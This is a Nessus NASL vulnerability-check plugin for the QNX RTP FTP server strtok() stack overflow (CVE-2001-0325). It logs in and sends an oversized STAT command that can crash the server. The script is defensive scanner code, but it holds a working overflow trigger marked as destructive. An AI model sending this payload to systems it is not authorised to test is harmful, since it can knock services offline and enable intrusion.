#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10692);
 script_bugtraq_id(2342);
 script_cve_id("CVE-2001-0325");
 script_xref(name:"OSVDB", value:"12212");
 script_version ("$Revision: 1.18 $");

 script_name(english:"QNX RTP FTP stat Command strtok() Function Overflow");
 script_summary(english:"strock() stack overflow");

 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a stack overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote FTP server is vulnerable to a stack overflow when calling
the 'strtok()' function. An attacker can exploit this flaw to execute
arbitrary code on the the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2001-02/0031.html" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"FTP");
 script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");
 script_require_keys("ftp/login", "Settings/ParanoidReport");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#

include('global_settings.inc');
include('misc_func.inc');
include('ftp_func.inc');

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/ftp");
if(!port)port = 21;

if (get_kb_item('ftp/'+port+'/broken') || 
    get_kb_item('ftp/'+port+'/backdoor')) exit(0);

if(get_port_state(port))
{
login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");


if(login)
{
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 if(ftp_authenticate(socket:soc, user:login,pass:password))
 {
 crp = crap(data:"a ", length:320);
 req = string("STAT ", crp, "\r\n");
 send(socket:soc, data:req);
 r = recv_line(socket:soc, length:4096, timeout: 3 * get_read_timeout());
 if(!r)
 {
  security_hole(port);
  exit(0);
 }
 data = string("QUIT\r\n");
 send(socket:soc, data:data);
 }
 close(soc);
 }
}
